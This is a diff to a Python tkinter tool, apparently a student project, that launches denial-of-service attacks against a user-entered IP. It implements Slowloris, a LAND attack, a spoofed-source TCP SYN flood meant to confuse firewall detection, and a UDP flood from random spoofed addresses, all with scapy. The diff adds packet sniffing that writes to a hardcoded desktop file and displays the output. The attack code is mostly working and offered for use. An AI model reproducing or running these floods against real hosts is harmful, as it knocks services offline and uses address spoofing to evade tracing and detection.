@@ -14,21 +14,23 @@ class GUIMODE():
         win.geometry("800x600")
         win.resizable(False, False)
 
-        right_frame = tkinter.Frame(win, relief="groove", bd=1)# 공격문의 상세설명창을 띄우는 구역을 생성
-        left_frame = tkinter.Frame(win, relief="groove", bd=1)# 공격문의 실행과 버튼 구역을 생성
+        right_frame = tkinter.Frame(win, relief="groove", bd=1)
+        left_frame = tkinter.Frame(win, relief="groove", bd=1)
 
-        right_frame.pack(side="right", fill="both", expand=True)#오른쪽 프레임을 실행
-        left_frame.pack(side="left", fill="both", expand=True)#왼쪽 프레임을 실행
+        right_frame.pack(side="right", fill="both", expand=True)
+        left_frame.pack(side="left", fill="both", expand=True)
 
         self.ip_dst_data = tkinter.StringVar()
 
         textbox = ttk.Entry(left_frame, width=20, textvariable=self.ip_dst_data)  # dst_IP 텍스트 공간 부여
-        packet_text = tkinter.Text(left_frame,width=60,height=35)  # 패킷 저장 내용 공간 부여
+        self.packet_text = tkinter.Label(left_frame,width=60,height=25)  # 패킷 저장 내용 공간 부여
         dos_manual=tkinter.Text(right_frame,width=50,height=50)
 
-        packet_text.grid(sticky='s', rowspan=1)
+        self.packet_text.grid(sticky='s', rowspan=1)
         textbox.grid(sticky='s', rowspan=2)   # 텍스트 칸 위치 선정
         dos_manual.grid(sticky='s')
+
+
 
         self.dst_port = 80
         self.s_port = RandNum(1024, 65535)  # 포트 랜덤
@@ -36,6 +38,9 @@ class GUIMODE():
         self.count = 30  # 몇번 반복할지 GUI 상에 설정
         self.Random = RandNum(1000, 9000)  # 무작위 설정 1000~9000
         self.s_ip = RandIP()
+
+
+
 
 
         # 버튼 위젯 생성
@@ -50,17 +55,41 @@ class GUIMODE():
         udp_flood_button.grid(sticky='n', rowspan=5)
         tcp_flood_button.grid(sticky='n', rowspan=6)
 
-        frame = tkinter.Frame(win)  # 프레임 생성
 
 
-        # Label을 수정하려면 config를 사용하면 된다.
 
         win.mainloop()
 
 
+    def showPacket(self,packet):
+        protocols = {1: 'ICMP', 6: 'TCP', 17: 'UDP'}
+        src_ip = packet[0][1].src
+        dst_ip = packet[0][1].dst
+        proto = packet[0][1].proto
+        if proto in protocols:
+            print("protocol: %s: %s -> %s" % (protocols[proto], src_ip, dst_ip))
+
+            if proto == 1:
+                print("TYPE: [%d], CODE[%d]" % (packet[0][2].type, packet[0][2].code))
+
+    def sniffing(self):
+        sniff(filter='ip', prn=self.showPacket, count=30)
+
+    def file_packit(self):
+        f = open("C:\\Users\\USER\\OneDrive\\바탕 화면\\packet.txt", "w")
+        sys.stdout = f
+        self.sniffing()
+        f.close
+    def file_read(self):
+        f = open("C:\\Users\\USER\\OneDrive\\바탕 화면\\packet.txt", "r")
+        lines = f.readlines()
+        for i in range(100):
+            self.packet_text.configure(text=lines)
 
     def Slowloris(self): # Slowloris 유주환
         dst_ip = self.ip_dst_data.get()
+        t = threading.Thread(target=self.file_packit)
+        t.start()
         # 헤더의 변수에 User-agent 사용자정보와 사용자언어를 넣었다.
         headers = [
             "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
@@ -115,12 +144,13 @@ class GUIMODE():
                         sockets.append(sock)  # sockets 리스트 맨뒤에 sock을 추가한다.
                 except socket.error:
                     break  # 에러시 break 문
-        t=threading.Thread(target=self.packet)
-    def packet(self):
+        self.file_read()
 
 
     def land(self):   # land 김진
         dst_ip = self.ip_dst_data.get()
+        e = threading.Thread(target=self.file_packit)
+        e.start()
         i = IP(src=dst_ip, dst=dst_ip)  #보낼 패킷을 입력한 주소와 함께 넣어준다
         i.proto = 6
         tu = TCP(dport=9001, sport=9001, flags=0x002) # 지정한 포트와 syn값을 tu 변수에 넣어준다.
@@ -128,34 +158,41 @@ class GUIMODE():
             self.intercount += 1
             send(i / tu / "hello word")
             print("send packet:", self.intercount) # 패킷 보냈다는 문구
+        self.file_read()
 
     def tcp_flood(self):    #tcp flood 이태서
+
         dst_ip = self.ip_dst_data.get()
         print("Packets are sending..") # 패킷 전송중
+        i = threading.Thread(target=self.file_packit)
+        i.start()
         i = IP(src=self.s_ip, dst=dst_ip) # 임의의 출발지 IP 생성 함수
         t = TCP(sport=self.Random, dport=self.dst_port, flags="S", seq=self.Random, window=self.Random) # 방화벽 탐지 설정 교란을 위한 무작위 숫자 추출 함수
         for Firewall_disturb in range(0, self.count):
             send(i / t, verbose=0)
             print("\nTotal packets sent: %i\n" % Firewall_disturb)
+        self.file_read()
+
 
     def udp_flood(self): # udp flood 정재훈
         dst_ip = self.ip_dst_data.get()
         duration = 100
-        timeout = time.time() + duration #공격시간 초과여부를 timeout 변수로 저장
+        timeout = time.time() + duration
         sent = 0
-
+        f = threading.Thread(target=self.file_packit)
+        f.start()
         for i in range(self.count):
-            if time.time() > timeout:    #설정한 공격시간이 지나면 종료
+            if time.time() > timeout:
                 break
-            else:                        #지나지 않으면 아래의 내용 반복
+            else:
                 pass
-            _ip = IP(src=RandIP(), dst=dst_ip) #출발IP 무작위 설정 / 목적지 아이피 설정
-            _udp = UDP(sport=self.s_port, dport=self.dst_port) #출발포트 무작위 설정 / 목적지 포트 설정
-            send(_ip / _udp, verbose=0)  #생성한 임의의 IP 설정으로 패킷 전송
+            _ip = IP(src=RandIP(), dst=dst_ip)
+            _udp = UDP(sport=self.s_port, dport=self.dst_port)
+            send(_ip / _udp, verbose=0)
             sent += 1
             print("UDP_Flooding_Attack Start: " + str(
                 sent) + " sent packages " + dst_ip + " At the Port " + str(self.dst_port))
-
+        self.file_read()
 
 
 application=GUIMODE()
